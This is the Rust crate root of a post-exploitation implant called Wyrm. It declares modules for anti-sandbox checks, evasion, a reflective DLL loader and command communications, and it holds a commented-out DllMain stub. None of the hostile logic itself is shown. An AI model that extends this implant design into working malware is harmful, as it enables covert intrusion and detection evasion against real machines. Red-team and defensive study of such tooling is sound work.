#![feature(string_remove_matches)]
#![feature(core_float_math)]
#![feature(const_option_ops)]
#![feature(const_trait_impl)]

use crate::utils::allocate::ProcessHeapAlloc;

mod anti_sandbox;
mod comms;
mod entry;
mod evasion;
mod execute;
mod native;
mod rdi_loader;
mod utils;
mod wyrm;

#[global_allocator]
static GLOBAL_ALLOC: ProcessHeapAlloc = ProcessHeapAlloc;

// /// DLLMain acts as the entrypoint for the Wyrm post exploitation payload. The DLL sets a global atomic to track the thread ID, which
// /// on exit, allows the thread to
// #[unsafe(no_mangle)]
// #[allow(non_snake_case)]
// unsafe extern "system" fn DllMain(_hmod_instance: HINSTANCE, dw_reason: u32, _: usize) -> i32 {
//     match dw_reason {
//         DLL_PROCESS_ATTACH => {
//             // internal_dll_start(StartType::DllMain)
//             let _ = Vec::<u8>::with_capacity(16);
//             let _ = String::from("test");
//             ()
//         }
//         _ => (),
//     }

//     1
// }
